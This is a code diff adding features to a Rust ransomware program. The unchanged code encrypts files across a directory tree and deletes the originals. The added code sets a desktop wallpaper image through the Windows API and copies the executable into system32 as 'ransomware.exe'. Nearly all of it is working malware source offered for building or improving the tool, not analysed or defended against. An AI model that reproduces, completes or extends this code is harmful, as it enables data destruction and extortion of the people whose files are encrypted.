@@ -1,11 +1,18 @@
 pub mod build;
 
-use std::fs::{File, remove_file};
-use std::io::{BufWriter, Read, Write};
+use std::ffi::OsStr;
+use std::fs::{self, remove_file, File};
+use std::io::{self, BufWriter, Read, Write};
+use std::os::windows::ffi::OsStrExt;
+use std::path::Path;
+
+extern crate winapi;
+use winapi::um::winuser::{SystemParametersInfoW, SPI_SETDESKWALLPAPER, SPIF_UPDATEINIFILE, SPIF_SENDCHANGE};
+
 
 use rsa::pkcs8::DecodePublicKey;
 use rsa::Pkcs1v15Encrypt;
-use rsa::{RsaPublicKey, pkcs1::DecodeRsaPublicKey};
+use rsa::RsaPublicKey;
 
 use orion::hazardous::{
     aead::xchacha20poly1305::{seal, open, Nonce, SecretKey},
@@ -19,6 +26,8 @@ use rand::distributions::Alphanumeric;
 use rand::Rng;
 use rand_core::{OsRng, RngCore};
 use walkdir::WalkDir;
+
+const IMAGE_DATA: &[u8] = include_bytes!(r"resources\backgroound.png");
 
 fn get_random(dest: &mut [u8]) {
     RngCore::fill_bytes(&mut OsRng, dest);
@@ -176,6 +185,51 @@ SwIDAQAB
         let _encrypted_filee = encrypt_large_file(entry.path().to_str().unwrap_or(""), &format!("{}{}", entry.path().to_str().unwrap_or(""), ".enc" ), pass.to_owned());
         let _ = remove_file(entry.path());
     }
+
+
+   
+
+
+    let temp_image_path = "C:\\temp_image.jpg";
+
+    match save_image_to_temp_file(temp_image_path, IMAGE_DATA) {
+        Ok(_) => println!("Image saved to temporary file successfully."),
+        Err(e) => {
+            eprintln!("Failed to save image to temporary file: {}", e);
+            return;
+        }
+    };
+
+    if let Err(e) = set_desktop_background(temp_image_path) {
+        eprintln!("Failed to set desktop background: {}", e);
+    }
+
+    let mut input = String::new();
+    io::stdin().read_line(&mut input)
+        .expect("Failed to read line");
+
+    let dest_dir = Path::new(r"%WINDIR%\system32\ransomware.exe");
+
+
+    let current_exe_path = match std::env::current_exe() {
+        Ok(path) => path,
+        Err(e) => {
+            eprintln!("Error getting current executable path: {}", e);
+            return;
+        }
+    };
+
+    println!("{:?}", current_exe_path);
+
+    if let Err(e) = fs::copy(&current_exe_path, &dest_dir) {
+        eprintln!("Error copying file: {}", e);
+        return;
+    }
+
+    let mut input = String::new();
+    io::stdin().read_line(&mut input)
+        .expect("Failed to read line");
+
 }
 fn generate_random_string(length: usize) -> String {
     let s : String = rand::thread_rng()
@@ -195,5 +249,28 @@ fn save_key_to_file(key: &[u8], file_name: &str) -> std::io::Result<()> {
     let key_file_path = desktop_dir.join(file_name);
     let mut key_file = BufWriter::new(File::create(&key_file_path)?);
     key_file.write_all(key)?;
+    Ok(())
+}
+
+
+fn save_image_to_temp_file(path: &str, data: &[u8]) -> std::io::Result<()> {
+    let mut file = File::create(path)?;
+    file.write_all(data)?;
+    file.sync_all()?;
+    Ok(())
+}
+
+fn set_desktop_background(path: &str) -> Result<(), String> {
+    let wide_path: Vec<u16> = OsStr::new(path).encode_wide().chain(std::iter::once(0)).collect();
+
+    unsafe {
+        let result = SystemParametersInfoW(
+            SPI_SETDESKWALLPAPER,
+            0,
+            wide_path.as_ptr() as *mut _,
+            SPIF_UPDATEINIFILE | SPIF_SENDCHANGE,
+        );
+    }
+
     Ok(())
 }
